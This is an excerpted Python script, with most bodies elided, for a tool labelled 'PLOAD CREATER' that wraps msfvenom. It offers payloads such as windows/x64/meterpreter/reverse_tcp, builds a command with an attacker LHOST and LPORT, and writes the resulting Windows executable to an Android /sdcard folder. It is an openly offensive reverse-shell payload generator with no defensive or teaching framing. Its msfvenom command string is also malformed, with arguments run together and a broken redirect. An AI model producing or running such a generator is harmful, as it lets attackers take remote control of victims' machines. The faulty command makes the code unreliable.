...
def banner ():
    ...
    print (c+fore+"     ■■  ■■")
    print (blue+hline)
    print (red+'(｡◕‿◕｡)➜'+cc+cyan+'   PLOAD CREATER')
    print(blue+'this tool is created by sunny thakur')
    print (blue+hline)
...
def in_put ():
    ...
    time.sleep(1.2)
    plist = ['windows/x64/meterpreter/reverse_tcp',
...
def create_payload (type, ip, port ,name, path='/sdcard/sunnythakur/'):
    ...
    x = "msfvenom -p "+type+' LHOST='+ip+' LPORT='+port+ '-f exe'  '-o '+path+name+' > /dev/null 2&>1'
...
def finaly (name):
    ...
    if os.path.exists('/sdcard/sunnythakur/'+name):
        ...
        'In '+red+'sunnythakur'+cyan+' folder...',
        'With name '+red+name+'...']
        for i in p:
            time.sleep(2)
            print (box+i)
...
def about ():
    ...
    ll = ['sunny thakur','coming soon','coming soon','sunny485']
    pp = ['coming soon..',
          #'https://youtube.com/c/D4Dr0id',
          #'https://instagram.com/d4_droid',
          'https://github.com/sunny/485']
